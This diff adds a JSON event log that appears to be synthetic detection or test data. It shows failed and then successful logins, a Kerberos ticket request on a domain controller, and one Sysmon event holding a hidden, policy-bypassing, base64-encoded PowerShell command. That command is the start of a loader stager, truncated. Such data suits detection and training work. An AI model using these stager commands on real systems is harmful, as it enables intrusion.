@@ -1,0 +1,63 @@
+{
+  "events": [
+    {
+      "timestamp": "2023-10-27T10:00:00Z",
+      "hostname": "WORKSTATION-01",
+      "user": "jdoe",
+      "source": "Windows Security",
+      "event_type": "Login Failed",
+      "severity": "LOW",
+      "metadata": {
+        "ip_address": "192.168.1.50",
+        "reason": "Bad Password"
+      }
+    },
+    {
+      "timestamp": "2023-10-27T10:00:05Z",
+      "hostname": "WORKSTATION-01",
+      "user": "jdoe",
+      "source": "Windows Security",
+      "event_type": "Login Failed",
+      "severity": "LOW",
+      "metadata": {
+        "ip_address": "192.168.1.50",
+        "reason": "Bad Password"
+      }
+    },
+    {
+      "timestamp": "2023-10-27T10:00:10Z",
+      "hostname": "WORKSTATION-01",
+      "user": "jdoe",
+      "source": "Windows Security",
+      "event_type": "Login Success",
+      "severity": "INFO",
+      "metadata": {
+        "ip_address": "192.168.1.50"
+      }
+    },
+    {
+      "timestamp": "2023-10-27T10:01:00Z",
+      "hostname": "WORKSTATION-01",
+      "user": "jdoe",
+      "source": "Sysmon",
+      "event_type": "Process Creation",
+      "severity": "MEDIUM",
+      "metadata": {
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEg..."
+      }
+    },
+    {
+      "timestamp": "2023-10-27T10:02:30Z",
+      "hostname": "DC-01",
+      "user": "SYSTEM",
+      "source": "Windows Security",
+      "event_type": "Kerberos Ticket Requested",
+      "severity": "HIGH",
+      "metadata": {
+        "client_address": "192.168.1.50",
+        "ticket_options": "0x40810010"
+      }
+    }
+  ]
+}
